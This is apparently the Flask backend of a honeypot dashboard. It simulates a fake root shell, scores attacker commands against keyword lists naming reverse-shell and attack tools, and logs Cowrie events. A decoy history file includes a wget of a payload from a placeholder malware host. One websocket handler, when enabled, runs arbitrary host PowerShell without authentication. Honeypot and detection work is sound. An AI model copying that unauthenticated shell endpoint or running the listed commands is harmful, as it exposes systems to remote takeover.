
import os
import sqlite3
import datetime
import hashlib
import json
import urllib.request
import jwt
import torch
import threading
import subprocess
import socket


from functools import wraps
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO, emit
from pymongo import MongoClient
from werkzeug.security import generate_password_hash, check_password_hash
from transformers import AutoTokenizer, AutoModelForCausalLM
from dotenv import load_dotenv

load_dotenv()

SECRET_KEY   = os.getenv("SECRET_KEY", "change-this-secret")
MONGO_URI    = os.getenv("MONGO_URI", "")
MONGO_DB     = os.getenv("MONGO_DB", "honey_hive")
MODEL_PATH   = os.getenv("MODEL_PATH", "./models/honeypot_model")
DB_PATH      = os.getenv("SQLITE_DB", "data/honeypot.db")
PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
ENABLE_HOST_POWERSHELL = os.getenv("ENABLE_HOST_POWERSHELL", "false").lower() in ("1", "true", "yes")

print("=" * 60)
print("DATABASE =", os.path.abspath(DB_PATH))
print("=" * 60)

USE_AI_MODEL     = os.getenv("USE_AI_MODEL", "false").lower() in ("1", "true", "yes")
COWRIE_JSON_URL  = os.getenv("COWRIE_JSON_URL", "").strip()
COWRIE_JSON_PATH = os.getenv("COWRIE_JSON_PATH", "").strip()

app = Flask(__name__, static_folder="../frontend/build", static_url_path="/")
app.config["SECRET_KEY"] = SECRET_KEY

CORS(app, resources={r"/*": {"origins": "*"}})
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode="threading"
)
# ── Thread-safe SQLite via thread-local connections ──────────────────────────
_local = threading.local()

def get_db():
    if not hasattr(_local, "conn"):
        _local.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        _local.conn.row_factory = sqlite3.Row
    return _local.conn

def get_cur():
    return get_db().cursor()

# ── MongoDB ──────────────────────────────────────────────────────────────────
mongo_users = None
if MONGO_URI:
    try:
        mongo_client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=4000)
        mongo_db     = mongo_client[MONGO_DB]
        mongo_users  = mongo_db["users"]
        mongo_users.create_index("email", unique=True)
        print("MongoDB connected")
    except Exception as exc:
        print(f"MongoDB connection failed: {exc}")

# ── Database setup ────────────────────────────────────────────────────────────
def setup_database():
    conn = get_db()
    cur  = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS logs (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp   TEXT,
            ip          TEXT,
            command     TEXT,
            response    TEXT,
            eventid     TEXT,
            src_port    TEXT,
            dst_ip      TEXT,
            dst_port    TEXT,
            session     TEXT,
            protocol    TEXT,
            message     TEXT,
            username    TEXT,
            password    TEXT,
            duration    TEXT,
            risk_score  INTEGER DEFAULT 0,
            country     TEXT DEFAULT '',
            city        TEXT DEFAULT '',
            lat         REAL  DEFAULT 0,
            lng         REAL  DEFAULT 0
        )
    """)
    required = {
        "eventid":    "TEXT", "src_port":  "TEXT", "dst_ip":   "TEXT",
        "dst_port":   "TEXT", "session":   "TEXT", "protocol": "TEXT",
        "message":    "TEXT", "username":  "TEXT", "password": "TEXT",
        "duration":   "TEXT", "risk_score":"INTEGER DEFAULT 0",
        "country":    "TEXT DEFAULT ''", "city": "TEXT DEFAULT ''",
        "lat":        "REAL DEFAULT 0",  "lng":  "REAL DEFAULT 0",
    }
    existing = {row[1] for row in cur.execute("PRAGMA table_info(logs)").fetchall()}
    for col, typ in required.items():
        if col not in existing:
            cur.execute(f"ALTER TABLE logs ADD COLUMN {col} {typ}")
    for idx, col in [
        ("idx_logs_timestamp", "timestamp"),
        ("idx_logs_ip",        "ip"),
        ("idx_logs_command",   "command"),
        ("idx_logs_eventid",   "eventid"),
        ("idx_logs_session",   "session"),
    ]:
        cur.execute(f"CREATE INDEX IF NOT EXISTS {idx} ON logs({col})")
    conn.commit()

setup_database()

# ── AI model ─────────────────────────────────────────────────────────────────
model        = None
tokenizer    = None
MODEL_LOADED = False

if USE_AI_MODEL and os.path.exists(MODEL_PATH):
    try:
        tokenizer = AutoTokenizer.from_pretrained(MODEL_PATH)
        model     = AutoModelForCausalLM.from_pretrained(MODEL_PATH)
        model.eval()
        MODEL_LOADED = True
        print("AI model loaded")
    except Exception as exc:
        print(f"Model loading failed: {exc}")
elif USE_AI_MODEL:
    print("Model folder not found — running in simulation mode.")

# ── Fake filesystem state per session ────────────────────────────────────────
session_cwd = {}
host_session_cwd = {}

FAKE_FS = {
    "/":        ["bin", "boot", "dev", "etc", "home", "lib", "opt", "proc", "root", "tmp", "usr", "var"],
    "/root":    [".bash_history", ".bashrc", ".ssh", "secret.txt"],
    "/etc":     ["passwd", "shadow", "hostname", "crontab", "ssh"],
    "/home":    ["ubuntu", "admin"],
    "/tmp":     ["systemd-private-abc123"],
    "/var":     ["log", "www", "spool"],
    "/var/log": ["auth.log", "syslog", "kern.log"],
}

FAKE_FILE_CONTENTS = {
    "/etc/passwd":         "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash",
    "/etc/shadow":         "root:$6$xyz$abc...hashed:19000:0:99999:7:::\nubuntu:$6$abc$xyz...hashed:19000:0:99999:7:::",
    "/etc/hostname":       "ubuntu-server",
    "/etc/crontab":        "# /etc/crontab\n* * * * * root /usr/bin/backup.sh",
    "/root/secret.txt":    "AWS_KEY=AKIAIOSFODNN7EXAMPLE\nDB_PASS=sup3rs3cr3t",
    "/root/.bash_history": "whoami\nid\nuname -a\ncat /etc/passwd\nwget http://malware.example.com/payload.sh",
    "/var/log/auth.log":   "May 28 14:23:01 sshd[1234]: Failed password for root from 192.168.1.50 port 48210\nMay 28 14:23:04 sshd[1234]: Accepted password for root from 192.168.1.50 port 48210",
}

# ── Risk classifier ───────────────────────────────────────────────────────────
def classify_risk(command="", eventid="", message=""):
    text = f"{command} {eventid} {message}".lower()
    normalized = (command or "").strip().lower()

    low_commands = {
        "", "ls", "dir", "pwd", "cd", "cd ..", "whoami", "id", "hostname",
        "date", "time", "uptime", "clear", "cls", "help", "history",
    }
    if normalized in low_commands or normalized.startswith(("ls ", "dir ", "cd ")):
        return 5

    critical = [
        "rm -rf", "mkfs", "dd if=", "bash -i", "/dev/tcp", "nc -e",
        "chmod 777", "exec 5<>", "python3 -c 'import socket",
        "python -c 'import socket", "perl -e 'use Socket",
        "/bin/sh -i", "0.0.0.0", "meterpreter", "reverse_tcp",
        "msfconsole", "msfvenom", "exploit/multi", "payload/",
        "nc -lv", "socat", "chattr -i", "iptables -f",
    ]
    high = [
        "wget", "curl", "scp", "tftp", "python -c", "perl -e",
        "base64", "busybox", "xmrig", "stratum+tcp", "minerd",
        "ssh-keygen", "authorized_keys", "known_hosts", "crontab -e",
        "chmod +x", "nmap", "masscan", "hydra", "medusa", "patator",
        "john", "hashcat", "sqlmap", "nikto", "gobuster", "dirb",
        "wpscan", "aircrack", "tcpdump", "wireshark", "mimikatz",
        "linpeas", "linenum", "pspy", "bloodhound", "proxychains",
        "torify", "sshpass", "crackmapexec",
    ]
    medium = [
        "cat /etc/passwd", "cat /etc/shadow",
        "login.failed", "ps aux", "netstat", "ifconfig", "ip addr",
        "history", "env", "printenv", "find / -perm", "sudo", " su ",
        "groups", "lastlog", "last ", "w ", "who ", "ss -", "lsof",
        "service ", "systemctl", "cowrie", "honeypot", "docker ps",
        "kubectl", "cat /proc", "ls /root", "ls /etc", "ls ~/.ssh",
    ]

    if any(x in text for x in critical): return 95
    if any(x in text for x in high):     return 75
    if any(x in text for x in medium):   return 45
    if "login.success" in text:          return 60
    return 20

# ── Fake shell simulator ──────────────────────────────────────────────────────
def simulate_command(command, session_id="default"):
    raw = command.strip()
    cmd = raw.lower()
    cwd = session_cwd.get(session_id, "/root")

    if cmd == "whoami":            return "root"
    if cmd == "id":                return "uid=0(root) gid=0(root) groups=0(root)"
    if cmd == "pwd":               return cwd
    if cmd == "hostname":          return "ubuntu-server"
    if cmd in ("clear",):          return "__CLEAR__"
    if cmd == "exit":              return "logout"
    if cmd == "uname -a":          return "Linux ubuntu-server 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux"
    if cmd == "uname -r":          return "5.15.0-91-generic"
    if cmd == "date":              return datetime.datetime.utcnow().strftime("%a %b %d %H:%M:%S UTC %Y")
    if cmd == "uptime":            return " 14:22:01 up 42 days,  3:17,  1 user,  load average: 0.01, 0.05, 0.10"
    if cmd == "w" or cmd == "who": return "root     pts/0        2024-05-28 14:00 (192.168.1.50)"

    if cmd == "ps aux":
        return ("USER       PID %CPU %MEM COMMAND\n"
                "root         1  0.0  0.1 /sbin/init\n"
                "root       441  0.1  0.4 /usr/sbin/sshd\n"
                "www-data   918  0.0  0.3 nginx: worker process\n"
                "root      1024  0.0  0.1 python3 app.py")

    if cmd in ("netstat -tulnp", "ss -tulnp"):
        return ("Proto Local Address   Foreign Address State   PID/Program\n"
                "tcp   0.0.0.0:22      0.0.0.0:*       LISTEN  441/sshd\n"
                "tcp   0.0.0.0:80      0.0.0.0:*       LISTEN  918/nginx\n"
                "tcp   0.0.0.0:5000    0.0.0.0:*       LISTEN  1024/python3")

    if cmd in ("ifconfig", "ip addr"):
        return ("eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n"
                "        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255\n"
                "        ether 08:00:27:12:34:56  txqueuelen 1000")

    if cmd == "env" or cmd == "printenv":
        return ("PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n"
                "HOME=/root\nUSER=root\nSHELL=/bin/bash\nTERM=xterm-256color")

    if cmd == "history":
        return "    1  whoami\n    2  id\n    3  uname -a\n    4  cat /etc/passwd\n    5  history"

    if cmd.startswith("ls"):
        target = cwd
        parts  = raw.split()
        if len(parts) > 1 and not parts[-1].startswith("-"):
            t = parts[-1]
            target = t if t.startswith("/") else os.path.join(cwd, t).replace("\\", "/")
        contents = FAKE_FS.get(target, [])
        if not contents:
            return f"ls: cannot access '{target}': No such file or directory"
        if "-la" in cmd or "-l" in cmd:
            lines = ["total " + str(len(contents) * 4)]
            for f in contents:
                lines.append(f"-rw-r--r-- 1 root root  512 May 28 14:00 {f}")
            return "\n".join(lines)
        return "  ".join(contents)

    if cmd.startswith("cd"):
        parts = raw.split(None, 1)
        if len(parts) == 1 or parts[1] == "~":
            session_cwd[session_id] = "/root"
            return ""
        dest = parts[1].strip()
        if dest == "..":
            parent = "/".join(cwd.rstrip("/").split("/")[:-1]) or "/"
            session_cwd[session_id] = parent
            return ""
        new_path = dest if dest.startswith("/") else (cwd.rstrip("/") + "/" + dest)
        new_path = new_path.rstrip("/") or "/"
        session_cwd[session_id] = new_path
        return ""

    if cmd.startswith("cat "):
        target = raw[4:].strip()
        if not target.startswith("/"):
            target = cwd.rstrip("/") + "/" + target
        if target in FAKE_FILE_CONTENTS:
            return FAKE_FILE_CONTENTS[target]
        return f"cat: {target}: No such file or directory"

    if cmd.startswith("wget ") or cmd.startswith("curl "):
        url   = raw.split()[-1]
        fname = url.split("/")[-1] or "index.html"
        return (f"--2024-05-28 14:23:01--  {url}\n"
                f"Resolving {url.split('/')[2]}... done.\n"
                f"HTTP request sent, awaiting response... 200 OK\n"
                f"Length: 4096 (4.0K)\n'{fname}' saved [4096/4096]")

    if cmd.startswith("chmod "): return ""
    if cmd.startswith("echo "):  return raw[5:]
    if cmd.startswith("find "):  return "/root/.bash_history\n/etc/passwd\n/etc/shadow\n/root/secret.txt"

    if "base64" in cmd:
        return "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo="

    if "python" in cmd or "perl" in cmd or "bash -i" in cmd or "/dev/tcp" in cmd:
        return ""

    return f"bash: {raw.split()[0] if raw.split() else raw}: command not found"


def ai_response(command, session_id="default"):
    simulated = simulate_command(command, session_id)
    if not USE_AI_MODEL or not MODEL_LOADED:
        return simulated

    prompt = f"<|attacker|> {command}\n<|system|>"
    inputs = tokenizer(prompt, return_tensors="pt")

    with torch.no_grad():
        outputs = model.generate(
            **inputs,
            max_new_tokens=80,
            do_sample=True,
            top_p=0.95,
            temperature=0.7,
            pad_token_id=tokenizer.eos_token_id,
        )

    decoded  = tokenizer.decode(outputs[0], skip_special_tokens=False)
    response = decoded.split("<|system|>")[-1]
    response = response.replace("<|endoftext|>", "").strip()

    if not response or response == simulated:
        return simulated
    if not simulated.startswith("bash: "):
        return simulated
    return response


def is_port_open(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(0.25)
        return sock.connect_ex(("127.0.0.1", port)) == 0


def start_background_process(args, cwd):
    creationflags = 0
    if os.name == "nt":
        creationflags = subprocess.CREATE_NEW_CONSOLE
    subprocess.Popen(args, cwd=cwd, creationflags=creationflags)


def run_host_powershell(command, session_id="default"):
    cwd = host_session_cwd.get(session_id, PROJECT_ROOT)

    if not ENABLE_HOST_POWERSHELL:
        return {
            "output": "",
            "error": "PowerShell mode is disabled. Start the backend with ENABLE_HOST_POWERSHELL=true to enable it.",
            "cwd": cwd,
        }

    raw = command.strip()
    lowered = raw.lower()

    if lowered in ("pwd", "cwd"):
        return {"output": cwd, "error": "", "cwd": cwd}

    if lowered.startswith("cd"):
        target = raw[2:].strip().strip('"')
        next_cwd = PROJECT_ROOT if not target else os.path.abspath(os.path.join(cwd, target))
        if os.path.isdir(next_cwd):
            host_session_cwd[session_id] = next_cwd
            return {"output": "", "error": "", "cwd": next_cwd}
        return {"output": "", "error": f"Directory not found: {next_cwd}", "cwd": cwd}

    if lowered == "project status":
        lines = [
            f"Backend port 5001: {'open' if is_port_open(5001) else 'closed'}",
            f"Frontend port 3000: {'open' if is_port_open(3000) else 'closed'}",
            f"Project root: {PROJECT_ROOT}",
        ]
        return {"output": "\n".join(lines), "error": "", "cwd": cwd}

    if lowered in ("start frontend", "start react"):
        if is_port_open(3000):
            return {"output": "Frontend already appears to be running on port 3000.", "error": "", "cwd": cwd}
        start_background_process(["npm", "start"], os.path.join(PROJECT_ROOT, "frontend"))
        return {"output": "Started React dev server in a new process.", "error": "", "cwd": cwd}

    if lowered == "start backend":
        if is_port_open(5001):
            return {"output": "Backend already appears to be running on port 5001.", "error": "", "cwd": cwd}
        start_background_process(["python", "app.py"], os.path.join(PROJECT_ROOT, "backend"))
        return {"output": "Started Flask backend in a new process.", "error": "", "cwd": cwd}

    if lowered == "start project":
        messages = []
        if is_port_open(5001):
            messages.append("Backend already running on port 5001.")
        else:
            start_background_process(["python", "app.py"], os.path.join(PROJECT_ROOT, "backend"))
            messages.append("Started Flask backend.")
        if is_port_open(3000):
            messages.append("Frontend already running on port 3000.")
        else:
            start_background_process(["npm", "start"], os.path.join(PROJECT_ROOT, "frontend"))
            messages.append("Started React dev server.")
        return {"output": "\n".join(messages), "error": "", "cwd": cwd}

    try:
        completed = subprocess.run(
            ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", raw],
            cwd=cwd,
            capture_output=True,
            text=True,
            timeout=60,
        )
        output = (completed.stdout or "").rstrip()
        error = (completed.stderr or "").rstrip()
        if completed.returncode and not error:
            error = f"Command exited with code {completed.returncode}"
        return {"output": output, "error": error, "cwd": cwd}
    except subprocess.TimeoutExpired:
        return {"output": "", "error": "Command timed out after 60 seconds.", "cwd": cwd}
    except Exception as exc:
        return {"output": "", "error": str(exc), "cwd": cwd}


# ── GeoIP ─────────────────────────────────────────────────────────────────────
try:
    import geoip2.database
    _geo_reader   = geoip2.database.Reader("GeoLite2-City.mmdb")
    GEO_AVAILABLE = True
except Exception:
    _geo_reader   = None
    GEO_AVAILABLE = False

FALLBACK_LOCATIONS = [
    {"lat": 51.5074, "lng": -0.1278,  "city": "London",    "country": "GB"},
    {"lat": 52.5200, "lng": 13.4050,  "city": "Berlin",    "country": "DE"},
    {"lat": 55.7558, "lng": 37.6173,  "city": "Moscow",    "country": "RU"},
    {"lat": 40.7128, "lng": -74.0060, "city": "New York",  "country": "US"},
    {"lat": 28.6139, "lng": 77.2090,  "city": "New Delhi", "country": "IN"},
    {"lat":  1.3521, "lng": 103.8198, "city": "Singapore", "country": "SG"},
    {"lat": 35.6762, "lng": 139.6503, "city": "Tokyo",     "country": "JP"},
    {"lat": 48.8566, "lng":   2.3522, "city": "Paris",     "country": "FR"},
]

def geo_lookup(ip):
    if GEO_AVAILABLE and _geo_reader:
        try:
            r = _geo_reader.city(ip)
            return {
                "lat":     r.location.latitude  or 0,
                "lng":     r.location.longitude or 0,
                "city":    r.city.name or "",
                "country": r.country.iso_code or "",
            }
        except Exception:
            pass
    digest = hashlib.md5(ip.encode()).hexdigest()
    loc    = FALLBACK_LOCATIONS[int(digest, 16) % len(FALLBACK_LOCATIONS)]
    return {"lat": loc["lat"], "lng": loc["lng"], "city": loc["city"], "country": loc["country"]}


# ── Row helper ────────────────────────────────────────────────────────────────
def row_to_log(row):
    return {
        "id":         row["id"],
        "timestamp":  row["timestamp"],
        "ip":         row["ip"],
        "command":    row["command"] or row["message"] or "",
        "response":   row["response"] or "",
        "eventid":    row["eventid"] or "",
        "session":    row["session"] or "",
        "message":    row["message"] or "",
        "username":   row["username"] or "",
        "password":   row["password"] or "",
        "risk_score": row["risk_score"] or 0,
        "country":    row["country"] or "",
        "city":       row["city"] or "",
        "lat":        row["lat"] or 0,
        "lng":        row["lng"] or 0,
    }


# ── Auth helpers ──────────────────────────────────────────────────────────────
def token_required(fn):
    @wraps(fn)
    def wrapper(*args, **kwargs):
        auth = request.headers.get("Authorization", "")
        if not auth.startswith("Bearer "):
            return jsonify({"error": "Missing authorization token"}), 401
        try:
            payload      = jwt.decode(auth[7:], SECRET_KEY, algorithms=["HS256"])
            request.user = payload
        except Exception:
            return jsonify({"error": "Invalid or expired token"}), 401
        return fn(*args, **kwargs)
    return wrapper


def create_token(user):
    payload = {
        "id":    str(user["_id"]),
        "email": user["email"],
        "name":  user.get("name", ""),
        "exp":   datetime.datetime.utcnow() + datetime.timedelta(days=1),
    }
    return jwt.encode(payload, SECRET_KEY, algorithm="HS256")


# ── API routes ────────────────────────────────────────────────────────────────
@app.route("/")
def index():
    return app.send_static_file("index.html")


@app.route("/api/auth/register", methods=["POST"])
def register():
    if mongo_users is None:
        return jsonify({"error": "MongoDB is not configured"}), 500
    data     = request.get_json() or {}
    name     = data.get("name", "").strip()
    email    = data.get("email", "").strip().lower()
    password = data.get("password", "")
    if not name or not email or not password:
        return jsonify({"error": "Name, email, and password are required"}), 400
    if len(password) < 6:
        return jsonify({"error": "Password must be at least 6 characters"}), 400
    user = {
        "name": name, "email": email,
        "password_hash": generate_password_hash(password),
        "created_at":    datetime.datetime.utcnow(),
    }
    try:
        result      = mongo_users.insert_one(user)
        user["_id"] = result.inserted_id
    except Exception:
        return jsonify({"error": "User already exists or database error"}), 400
    return jsonify({"token": create_token(user), "user": {"name": name, "email": email}})


@app.route("/api/auth/login", methods=["POST"])
def login():
    if mongo_users is None:
        return jsonify({"error": "MongoDB is not configured"}), 500
    data     = request.get_json() or {}
    email    = data.get("email", "").strip().lower()
    password = data.get("password", "")
    user     = mongo_users.find_one({"email": email})
    if not user or not check_password_hash(user["password_hash"], password):
        return jsonify({"error": "Invalid email or password"}), 401
    return jsonify({"token": create_token(user), "user": {"name": user.get("name", ""), "email": email}})


@app.route("/api/health")
def health():
    return jsonify({"status": "ok", "model_loaded": MODEL_LOADED, "mongo_connected": mongo_users is not None})


@app.route("/api/logs")
def get_logs():
    cur    = get_cur()
    search = request.args.get("search", "").strip()
    limit  = min(int(request.args.get("limit", 200)), 1000)
    if search:
        p = f"%{search}%"
        cur.execute("""
            SELECT * FROM logs
            WHERE ip LIKE ? OR command LIKE ? OR message LIKE ? OR username LIKE ? OR eventid LIKE ?
            ORDER BY id DESC LIMIT ?
        """, (p, p, p, p, p, limit))
    else:
        cur.execute("SELECT * FROM logs ORDER BY id DESC LIMIT ?", (limit,))
    return jsonify([row_to_log(r) for r in cur.fetchall()])


@app.route("/api/summary")
def summary():
    cur = get_cur()
    cur.execute("SELECT COUNT(*) AS total FROM logs")
    total = cur.fetchone()["total"]
    cur.execute("SELECT COUNT(DISTINCT ip) AS u FROM logs WHERE ip IS NOT NULL AND ip != ''")
    unique_ips = cur.fetchone()["u"]
    cur.execute("SELECT COUNT(*) AS h FROM logs WHERE risk_score >= 70")
    high_risk = cur.fetchone()["h"]
    cur.execute("""
        SELECT COALESCE(NULLIF(command,''), eventid, message, 'unknown') AS top_item, COUNT(*) AS cnt
        FROM logs GROUP BY top_item ORDER BY cnt DESC LIMIT 1
    """)
    top    = cur.fetchone()
    cur.execute("SELECT ip FROM logs WHERE ip IS NOT NULL AND ip != '' ORDER BY id DESC LIMIT 1")
    latest = cur.fetchone()
    return jsonify({
        "total_attacks": total,
        "unique_ips":    unique_ips,
        "high_risk":     high_risk,
        "top_command":   top["top_item"] if top else "none",
        "latest_ip":     latest["ip"] if latest else "none",
    })


@app.route("/api/command-stats")
def command_stats():
    cur = get_cur()
    cur.execute("""
        SELECT COALESCE(NULLIF(command,''), eventid, 'unknown') AS label, COUNT(*) AS cnt
        FROM logs GROUP BY label ORDER BY cnt DESC LIMIT 10
    """)
    rows = cur.fetchall()
    return jsonify({"labels": [r["label"] for r in rows], "values": [r["cnt"] for r in rows]})


@app.route("/api/clusters")
def clusters():
    cur = get_cur()
    cur.execute("""
        SELECT ip, session,
               GROUP_CONCAT(COALESCE(NULLIF(command,''), eventid), ', ') AS actions,
               COUNT(*) AS cnt, MAX(risk_score) AS max_risk
        FROM logs WHERE ip IS NOT NULL AND ip != ''
        GROUP BY ip, session ORDER BY max_risk DESC, cnt DESC LIMIT 50
    """)
    data = []
    for row in cur.fetchall():
        risk    = row["max_risk"] or 0
        cluster = 2 if risk >= 70 else 1 if risk >= 40 else 0
        data.append({
            "session":    row["session"] or row["ip"],
            "ip":         row["ip"],
            "commands":   (row["actions"] or "").split(", "),
            "count":      row["cnt"],
            "risk_score": risk,
            "cluster":    cluster,
        })
    return jsonify({"data": data})


@app.route("/api/attack-ips")
def attack_ips():
    cur = get_cur()
    cur.execute("""
        SELECT ip, COUNT(*) AS cnt, MAX(risk_score) AS risk_score, city, country, lat, lng
        FROM logs WHERE ip IS NOT NULL AND ip != ''
        GROUP BY ip ORDER BY cnt DESC LIMIT 50
    """)
    positions = []
    for row in cur.fetchall():
        if row["lat"] and row["lng"]:
            geo = {"lat": row["lat"], "lng": row["lng"], "city": row["city"] or "", "country": row["country"] or ""}
        else:
            geo = geo_lookup(row["ip"])
        positions.append({
            "ip":         row["ip"],
            "lat":        geo["lat"],
            "lng":        geo["lng"],
            "city":       geo["city"],
            "country":    geo["country"],
            "count":      row["cnt"],
            "risk_score": row["risk_score"] or 0,
        })
    return jsonify(positions)


@app.route("/api/timeline")
def timeline():
    cur = get_cur()
    cur.execute("""
        SELECT strftime('%H:00', timestamp) AS hour, COUNT(*) AS cnt
        FROM logs
        WHERE timestamp >= datetime('now', '-24 hours')
        GROUP BY hour ORDER BY hour
    """)
    rows = cur.fetchall()
    return jsonify({"labels": [r["hour"] for r in rows], "values": [r["cnt"] for r in rows]})


# ── WebSocket – Terminal ──────────────────────────────────────────────────────
@socketio.on("terminal_input")
def handle_terminal(data):
    command    = (data or {}).get("command", "").strip()
    session_id = (data or {}).get("session_id", request.sid)
    if not command:
        return

    ip         = request.headers.get("X-Forwarded-For", request.remote_addr or "127.0.0.1").split(",")[0].strip()
    timestamp  = datetime.datetime.utcnow().isoformat() + "Z"
    response   = ai_response(command, session_id)
    risk_score = classify_risk(command=command)
    geo        = geo_lookup(ip)

    conn = get_db()
    cur  = conn.cursor()

    if response != "__CLEAR__":
        cur.execute("""
            INSERT INTO logs
                (timestamp, ip, command, response, eventid, protocol, message,
                 risk_score, country, city, lat, lng)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?)
        """, (timestamp, ip, command, response, "terminal.command", "ssh",
              command, risk_score, geo["country"], geo["city"], geo["lat"], geo["lng"]))
        conn.commit()

    event = {
        "timestamp":  timestamp,
        "ip":         ip,
        "command":    command,
        "response":   response,
        "risk_score": risk_score,
        "city":       geo["city"],
        "country":    geo["country"],
        "lat":        geo["lat"],
        "lng":        geo["lng"],
    }

    emit("terminal_output", event)
    socketio.emit("new_attack", event)


@socketio.on("host_terminal_input")
def handle_host_terminal(data):
    command = (data or {}).get("command", "").strip()
    session_id = (data or {}).get("session_id", request.sid)
    if not command:
        return

    result = run_host_powershell(command, session_id)
    emit("host_terminal_output", {
        "command": command,
        "output": result.get("output", ""),
        "error": result.get("error", ""),
        "cwd": result.get("cwd", PROJECT_ROOT),
    })


# ── Internal endpoint: called by cowrie_watcher.py ───────────────────────────
@app.route("/api/internal/cowrie_event", methods=["POST"])
def internal_cowrie_event():
    data = request.get_json() or {}

    timestamp  = data.get("timestamp",  datetime.datetime.utcnow().isoformat() + "Z")
    ip         = data.get("ip",         "")
    command    = data.get("command",    data.get("username", ""))
    eventid    = data.get("eventid",    "")
    session    = data.get("session",    "")
    username   = data.get("username",   "")
    password   = data.get("password",   "")
    message    = data.get("message",    "")
    risk_score = data.get("risk_score", 0)
    city       = data.get("city",       "")
    country    = data.get("country",    "")
    lat        = data.get("lat",        0)
    lng        = data.get("lng",        0)

    # Save to SQLite
    try:
        conn = get_db()
        cur  = conn.cursor()
        cur.execute("""
            INSERT INTO logs
                (timestamp, ip, command, response, eventid, session,
                 protocol, message, username, password,
                 risk_score, country, city, lat, lng)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
        """, (timestamp, ip, command, "", eventid, session,
              "ssh", message, username, password,
              risk_score, country, city, lat, lng))
        conn.commit()
    except Exception as e:
        print(f"[app] DB insert error: {e}")

    event = {
        "timestamp":  timestamp,
        "ip":         ip,
        "command":    command,
        "eventid":    eventid,
        "session":    session,
        "username":   username,
        "password":   password,
        "message":    message,
        "risk_score": risk_score,
        "city":       city,
        "country":    country,
        "lat":        lat,
        "lng":        lng,
    }

    socketio.emit("new_attack", event)
    return jsonify({"ok": True})

if __name__ == "__main__":
    print("=" * 60)
    print("Backend running on http://localhost:5001")
    print("=" * 60)

    socketio.run(
        app,
        host="0.0.0.0",
        port=5001,
        debug=False,
        allow_unsafe_werkzeug=True
    )